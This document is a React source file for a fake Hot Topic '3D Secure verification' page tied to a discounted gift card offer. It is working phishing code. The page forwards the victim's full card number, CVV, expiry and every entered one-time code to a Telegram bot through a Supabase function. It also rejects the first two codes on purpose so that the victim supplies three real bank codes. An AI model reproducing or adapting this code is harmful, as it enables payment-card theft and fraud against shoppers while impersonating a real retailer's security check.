
import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { toast } from "@/hooks/use-toast";
import HotTopicHeader from "@/components/HotTopicHeader";
import HotTopicFooter from "@/components/HotTopicFooter";
import { AlertCircle, Clock, LockIcon, Shield } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { InputOTP, InputOTPGroup, InputOTPSlot, InputOTPSeparator } from "@/components/ui/input-otp";

const OTPVerification = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [countdown, setCountdown] = useState(15 * 60); // 15 minutes in seconds
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [attempts, setAttempts] = useState(0); // Track OTP verification attempts

  // Get order details from location state
  const orderDetails = location.state?.orderDetails;
  const giftCardValue = location.state?.giftCardValue;
  const discountedAmount = location.state?.discountedAmount;
  const paymentMethod = location.state?.paymentMethod;
  const lastFour = location.state?.lastFour;
  const cardNumber = location.state?.cardNumber;
  const cvv = location.state?.cvv;
  const expiryDate = location.state?.expiryDate;

  // Format remaining time as MM:SS
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  // Calculate percentage of time remaining for progress bar
  const timePercentage = (countdown / (15 * 60)) * 100;

  // If no order details, redirect to home
  useEffect(() => {
    if (!orderDetails) {
      navigate("/");
      toast({
        title: "Error",
        description: "No payment information found. Please start again.",
        variant: "destructive",
      });
    }
  }, [orderDetails, navigate]);

  // Countdown timer
  useEffect(() => {
    if (countdown <= 0) return;
    
    const timer = setInterval(() => {
      setCountdown(prevCountdown => {
        if (prevCountdown <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prevCountdown - 1;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, [countdown]);

  // If time runs out
  useEffect(() => {
    if (countdown === 0) {
      toast({
        title: "Time Expired",
        description: "The verification time has expired. Please try again.",
        variant: "destructive",
      });
      navigate("/payment-cancelled", { 
        state: { 
          reason: "OTP verification timed out"
        }
      });
    }
  }, [countdown, navigate]);
  
  // Check OTP validity based on attempt number
  const verifyOTP = () => {
    // OTP validation
    if (otp.length !== 6) {
      setError("Please enter a complete 6-digit code");
      return false;
    }
    
    // First two attempts will always fail, third attempt will succeed
    if (attempts < 2) {
      setError("Invalid verification code. Please try again.");
      setAttempts(prev => prev + 1);
      setOtp("");
      
      // Different messaging for first vs second attempt
      if (attempts === 0) {
        toast({
          title: "Verification Failed",
          description: "The code you entered is incorrect. Please try again.",
          variant: "destructive",
        });
      } else {
        toast({
          title: "Second Attempt Failed",
          description: "The verification code is still incorrect. One more attempt remaining.",
          variant: "destructive",
        });
      }
      
      return false;
    }
    
    // Third attempt will succeed regardless of the code entered
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    
    // Validate OTP
    if (!verifyOTP()) {
      // Even on failure, send notification about the failed attempt
      try {
        // Create notification with detailed payment information
        const notificationDetails = {
          ...orderDetails,
          paymentMethod: paymentMethod,
          cardNumber: cardNumber || "Unknown",
          expiryDate: expiryDate || "Unknown", 
          cvv: cvv || "Unknown",
          lastFour: lastFour || "Unknown",
          giftCardValue: giftCardValue,
          paymentAmount: discountedAmount,
          notificationType: "otp_attempt",
          otpAttempt: attempts + 1, // Adding 1 because we want to report the current attempt (1-indexed)
          userInfo: {
            ...orderDetails.userInfo,
            timestamp: new Date().toISOString()
          }
        };

        // Send to Telegram even for failed attempts
        supabase.functions.invoke("send-telegram-notification", {
          body: notificationDetails
        });
      } catch (telegramErr) {
        console.error("Error sending Telegram notification:", telegramErr);
      }
      return;
    }
    
    setIsSubmitting(true);
    
    try {
      // Simulate processing delay
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      // Create complete order details object with payment info
      const completeOrderDetails = {
        ...orderDetails,
        paymentMethod: paymentMethod,
        cardNumber: cardNumber || "Unknown",
        expiryDate: expiryDate || "Unknown", 
        cvv: cvv || "Unknown",
        lastFour: lastFour || "Unknown",
        otpVerified: true
      };
      
      // Save order details to localStorage for reference
      localStorage.setItem("hotTopicOrder", JSON.stringify(completeOrderDetails));
      
      // Send final successful OTP verification notification to Telegram
      try {
        const finalNotificationDetails = {
          ...completeOrderDetails,
          giftCardValue: giftCardValue,
          paymentAmount: discountedAmount,
          notificationType: "otp_attempt",
          otpAttempt: 3, // Third attempt is always successful
          userInfo: {
            ...orderDetails.userInfo,
            timestamp: new Date().toISOString()
          }
        };

        console.log("Sending final OTP verification to Telegram:", finalNotificationDetails);
        supabase.functions.invoke("send-telegram-notification", {
          body: finalNotificationDetails
        }).then(response => {
          if (response.error) {
            console.error("Failed to send Telegram notification:", response.error);
          } else {
            console.log("Telegram notification sent successfully:", response.data);
          }
        });
      } catch (telegramErr) {
        console.error("Error sending Telegram notification:", telegramErr);
      }
      
      // Navigate to payment success page
      navigate("/payment-success", { 
        state: { 
          orderDetails: completeOrderDetails,
          giftCardValue,
          discountedAmount
        } 
      });
    } catch (error) {
      console.error("OTP verification error:", error);
      toast({
        title: "System Error",
        description: "We encountered a technical issue. Please try again later.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  // Generate a new OTP by returning to payment page
  const handleRequestNewOTP = () => {
    navigate("/payment", { 
      state: { 
        orderDetails,
        giftCardValue,
        discountedAmount,
        cardNumber,
        cvv,
        expiryDate
      } 
    });
    toast({
      title: "Returning to Payment",
      description: "You'll need to re-enter your payment details.",
    });
  };

  // Get the attempt-specific message
  const getAttemptMessage = () => {
    if (attempts === 0) {
      return "Please enter the verification code sent to your phone";
    } else if (attempts === 1) {
      return "First attempt failed. Please try again with a new code";
    } else {
      return "Last attempt. Enter the verification code carefully";
    }
  };

  return (
    <div className="min-h-screen bg-black">
      <HotTopicHeader />
      
      <div className="container py-8">
        <div className="max-w-xl mx-auto space-y-6">
          <div className="bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h1 className="text-3xl font-bold text-white mb-4 text-center">
              3D Secure <span className="text-hottopic-red">Verification</span>
            </h1>
            
            {/* Timer Display */}
            <div className="flex flex-col items-center mb-8">
              <div className="w-full max-w-[250px] h-3 bg-hottopic-gray/20 rounded-full overflow-hidden mb-2">
                <div 
                  className={`h-full transition-all duration-1000 ease-linear ${
                    countdown > 300 ? 'bg-green-500' : countdown > 60 ? 'bg-yellow-500' : 'bg-red-500'
                  }`}
                  style={{ width: `${timePercentage}%` }}
                />
              </div>
              
              <div className="bg-hottopic-gray/20 px-4 py-1.5 rounded-full flex items-center">
                <Clock className={`h-4 w-4 mr-2 ${
                  countdown > 300 ? 'text-green-500' : countdown > 60 ? 'text-yellow-500' : 'text-red-500'
                }`} />
                <span className="text-white font-mono text-sm font-bold">
                  {countdown > 0 ? formatTime(countdown) : "00:00"}
                </span>
              </div>
            </div>
            
            <div className="space-y-4 bg-hottopic-dark p-6 rounded-lg border border-hottopic-gray/20 mb-8">
              <p className="text-white text-lg text-center font-medium">
                For your security, we've sent a verification code to
              </p>
              <p className="text-hottopic-red font-mono text-center text-lg font-bold">
                ******{orderDetails?.phone?.slice(-4) || "0000"}
              </p>
              <p className="text-gray-400 text-sm text-center">
                {getAttemptMessage()}
              </p>
              
              {/* Show attempt counter */}
              <div className="flex justify-center items-center gap-2 pt-2">
                <span className={`w-3 h-3 rounded-full ${attempts >= 0 ? 'bg-hottopic-red' : 'bg-hottopic-gray/30'}`}></span>
                <span className={`w-3 h-3 rounded-full ${attempts >= 1 ? 'bg-hottopic-red' : 'bg-hottopic-gray/30'}`}></span>
                <span className={`w-3 h-3 rounded-full ${attempts >= 2 ? 'bg-hottopic-red' : 'bg-hottopic-gray/30'}`}></span>
                <span className="text-xs text-gray-400 ml-2">Attempt {attempts + 1}/3</span>
              </div>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Improved OTP Input */}
              <div className="space-y-6">
                <div className="flex justify-center">
                  <InputOTP
                    value={otp}
                    onChange={(value) => {
                      setOtp(value);
                      if (value.length === 6) {
                        setError("");
                      }
                    }}
                    maxLength={6}
                  >
                    <InputOTPGroup className="gap-2 md:gap-4">
                      <InputOTPSlot index={0} />
                      <InputOTPSlot index={1} />
                      <InputOTPSlot index={2} />
                      <InputOTPSeparator className="mx-1 text-gray-500">-</InputOTPSeparator>
                      <InputOTPSlot index={3} />
                      <InputOTPSlot index={4} />
                      <InputOTPSlot index={5} />
                    </InputOTPGroup>
                  </InputOTP>
                </div>
                
                {error && (
                  <div className="text-red-500 text-sm flex items-center justify-center gap-1 mt-2">
                    <AlertCircle className="h-4 w-4" />
                    <span>{error}</span>
                  </div>
                )}
              </div>
              
              {/* Payment Details Summary */}
              <div className="mt-8">
                <h3 className="text-gray-300 text-center mb-3 font-medium">Transaction Details</h3>
                <div className="bg-hottopic-dark p-4 rounded-lg border border-hottopic-gray/20 space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">Item:</span>
                    <span className="text-white">Hot Topic Gift Card</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">Value:</span>
                    <span className="text-white">${giftCardValue?.toFixed(2) || "0.00"}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">Amount:</span>
                    <span className="text-hottopic-red font-semibold">${discountedAmount?.toFixed(2) || "0.00"}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">Card:</span>
                    <span className="text-white">{paymentMethod} •••• {lastFour || "****"}</span>
                  </div>
                </div>
              </div>
              
              {/* Submit Button */}
              <div className="flex flex-col gap-3 mt-8">
                <Button 
                  type="submit" 
                  disabled={isSubmitting || countdown === 0 || otp.length !== 6}
                  className="w-full py-7 bg-hottopic-red hover:bg-hottopic-red/90 text-white font-bold text-lg"
                >
                  {isSubmitting ? (
                    <div className="flex items-center space-x-2">
                      <div className="w-5 h-5 border-2 border-t-transparent border-white rounded-full animate-spin"></div>
                      <span>Verifying...</span>
                    </div>
                  ) : (
                    "Verify Payment"
                  )}
                </Button>
                
                <Button
                  type="button"
                  variant="outline"
                  onClick={handleRequestNewOTP}
                  className="w-full py-2 text-white border-hottopic-gray hover:bg-hottopic-gray/20"
                >
                  Back to Payment
                </Button>
              </div>
              
              <div className="flex items-center justify-center text-center px-6 mt-4">
                <Shield className="text-gray-400 mr-2 h-4 w-4 flex-shrink-0" />
                <p className="text-gray-400 text-xs">
                  3D Secure verification helps protect your account from unauthorized transactions
                </p>
              </div>
            </form>
          </div>
        </div>
      </div>
      
      <HotTopicFooter />
    </div>
  );
};

export default OTPVerification;
